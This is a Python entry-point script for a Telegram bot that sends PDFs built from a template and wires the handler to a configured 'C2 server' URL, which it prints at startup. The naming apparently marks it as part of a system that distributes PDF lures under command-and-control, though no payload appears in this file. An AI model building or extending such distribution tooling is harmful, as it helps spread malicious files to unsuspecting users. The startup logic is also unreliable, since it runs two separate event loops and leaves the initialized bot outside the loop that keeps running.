"""Main bot initialization and entry point."""

from src.distribution.telegram.config.settings import BotConfig
from src.distribution.telegram.handlers.pdf_handler import PDFHandler
from src.distribution.telegram.bot.utils.pdf_sender import PDFSender


async def initialize_bot(
    pdf_template_path: str = "src/distribution/repository/storage/templates/base.pdf",
) -> PDFHandler:
    """Initialize and configure the Telegram bot."""
    config = BotConfig.from_env()
    
    # Initialize handler
    handler = PDFHandler(
        bot_token=config.bot_token,
        pdf_storage=config.pdf_storage,
        c2_server_url=config.c2_server_url,
    )
    
    # Initialize bot client
    app = await handler.initialize_bot()
    
    # Configure handlers
    handler.register_handlers(app)
    
    print(f"✅ Bot initialized: {app.me.username}")
    print(f"   PDF Storage: {config.pdf_storage}")
    print(f"   C2 Server: {config.c2_server_url}")
    
    return handler


def main():
    """Main entry point for the Telegram bot."""
    import asyncio
    
    handler = asyncio.run(initialize_bot())
    
    # Keep bot running
    async def run():
        while True:
            await asyncio.sleep(60)
    
    asyncio.run(run())


if __name__ == "__main__":
    main()